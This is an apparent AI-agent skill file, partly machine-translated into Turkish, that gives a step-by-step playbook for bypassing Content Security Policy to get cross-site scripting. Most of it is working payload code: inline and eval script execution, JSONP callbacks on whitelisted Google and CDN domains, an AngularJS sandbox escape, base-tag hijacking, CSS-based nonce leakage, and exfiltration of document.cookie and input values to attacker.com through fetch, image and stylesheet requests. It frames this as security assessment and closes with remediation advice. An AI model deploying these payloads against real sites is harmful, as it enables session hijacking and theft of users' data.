---
name: performing-content-security-policy-bypass
description: Analyze and bypass Content Security Policy implementations to achieve cross-site scripting by exploiting misconfigurations, JSONP endpoints, unsafe directives, and policy injection techniques.
tags:
- csp-bypass
- xss
- script-injection
- siber-güvenlik
- nonce-bypass
- fetih
- web-application-security
- cybersecurity
- policy-misconfiguration
- content-security-policy
- jsonp
triggers:
- CSRF
- SQL injection
- XSS
- alert
- api
- bypass
- cloud
- content
- dns
- endpoint
- exploit
- hash
category: web-application-security
source_subdomain: web-application-security
nist_csf:
- PR.PS-01
- ID.RA-01
- PR.DS-10
- DE.CM-01
---

# Performing Content Security Policy Bypass


## Ne Zaman Kullanılır
- XSS yaparken: is found but execution is blocked by Content Security Policy
- During web application security assessments to evaluate CSP effectiveness
- testing yaparken the robustness of CSP against known bypass techniques
- During bug bounty hunting where CSP prevents direct XSS exploitation
- auditing yaparken CSP header configuration for security weaknesses

## Ön Gereksinimler
- Burp Suite for intercepting responses and analyzing CSP headers
- CSP Evaluator (Google) for automated policy analysis
- Understanding of CSP directives (script-src, default-src, style-src, etc.)
- Bilgi: CSP bypass techniques (JSONP, base-uri, object-src)
- Browser developer tools for CSP violation monitoring
- Collection of whitelisted domain JSONP endpoints

## İş Akışı

### Adım 1 — Şunu analiz et: CSP Policy
```bash
curl -sI http://target.com | grep -i "content-security-policy"

curl -s http://target.com | grep -i "content-security-policy"


curl -sI http://target.com | grep -i "content-security-policy-report-only"

```

### Adım 2 — Exploit unsafe-inline and unsafe-eval
```bash
<script>alert(document.domain)</script>
<img src=x onerror="alert(1)">

<script>eval('alert(1)')</script>
<script>setTimeout('alert(1)',0)</script>
<script>new Function('alert(1)')()</script>

```

### Adım 3 — Exploit Whitelisted Domain JSONP Endpoints
```bash

<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)"></script>


<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js"></script>
<div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>

<script src="https://whitelisted-api.com/endpoint?callback=alert(1)//">
</script>
```

### Adım 4 — Exploit base-uri and Form Action Bypasses
```bash
<base href="https://attacker.com/">

<form action="https://attacker.com/steal" method="POST">
  <input name="csrf_token" value="">
</form>
<script>document.forms[0].submit()</script>

<object data="https://attacker.com/exploit.swf"></object>
<embed src="https://attacker.com/exploit.swf">
```

### Adım 5 — Exploit Nonce and Hash Bypasses
```bash
<style>
  script[nonce^="a"] { background: url("https://attacker.com/leak?nonce=a"); }
  script[nonce^="b"] { background: url("https://attacker.com/leak?nonce=b"); }
</style>


<form id="csp"><input name="nonce" value="attacker-controlled"></form>


```

### Adım 6 — Exploit Data Exfiltration Without script-src
```bash

<img src="https://attacker.com/steal?data=SENSITIVE_DATA">

<style>
input[value^="a"] { background: url("https://attacker.com/?char=a"); }
input[value^="b"] { background: url("https://attacker.com/?char=b"); }
</style>

<script nonce="valid">
  fetch('https://attacker.com/steal?data=' + document.cookie);
</script>

<link rel="dns-prefetch" href="//data.attacker.com">

```

## Key Concepts

| Concept | Description |
|---------|-------------|
| unsafe-inline | CSP directive allowing inline script execution, defeating XSS protection |
| Nonce-based CSP | Using random nonces to allow specific scripts while blocking injected ones |
| JSONP Bypass | Exploiting JSONP endpoints on whitelisted domains to execute attacker callbacks |
| Policy Injection | Injecting CSP directives through reflected user input in headers |
| base-uri Hijacking | Redirecting relative script loads by injecting a base element |
| Script Gadgets | Legitimate library features that can be abused to bypass CSP |
| CSP Report-Only | Non-enforcing CSP mode that only logs violations without blocking |

## Tools & Systems

| Tool | Purpose |
|------|---------|
| CSP Evaluator | Google tool for analyzing CSP policy weaknesses |
| Burp Suite | HTTP proxy for CSP header analysis and bypass testing |
| CSP Scanner | Browser extension for identifying CSP bypass opportunities |
| csp-bypass | Curated list of CSP bypass techniques and payloads |
| RetireJS | Identify vulnerable JavaScript libraries on whitelisted CDNs |
| DOM Invader | Burp tool for testing CSP bypasses through DOM manipulation |

## Common Scenarios

1. **JSONP Callback XSS** — Exploit JSONP endpoints on whitelisted CDN domains to execute JavaScript callbacks containing XSS payloads
2. **AngularJS Sandbox Escape** — Load AngularJS from whitelisted CDN and use template injection to bypass CSP script restrictions
3. **Nonce Leakage** — Extract CSP nonce values through CSS injection or DOM clobbering to inject scripts with valid nonces
4. **Base URI Hijacking** — Inject base element to redirect all relative script loads to attacker-controlled server
5. **Report-Only Exploitation** — Identify CSP in report-only mode where violations are logged but not blocked, enabling direct XSS

## Output Format

```
## CSP Bypass Assessment Report
- **Target**: http://target.com
- **CSP Mode**: Enforced
- **Policy**: script-src 'self' https://cdn.jsdelivr.net; default-src 'self'

### CSP Analysis
| Directive | Value | Risk |
|-----------|-------|------|
| script-src | 'self' cdn.jsdelivr.net | JSONP/Library bypass possible |
| default-src | 'self' | Moderate |
| base-uri | Not set | base-uri hijacking possible |
| object-src | Not set (falls back to default-src) | Low |

### Bypass Techniques Found
| # | Technique | Payload | Impact |
|---|-----------|---------|--------|
| 1 | AngularJS via CDN | Load angular.min.js + template injection | Full XSS |
| 2 | Missing base-uri | <base href="https://evil.com/"> | Script hijack |

### İyileştirme
- Remove whitelisted CDN domains; use nonce-based or hash-based CSP
- Add base-uri 'self' to prevent base element injection
- Add object-src 'none' to block plugin-based execution
- Migrate from unsafe-inline to strict nonce-based policy
- Implement strict-dynamic for modern CSP3 browsers
```
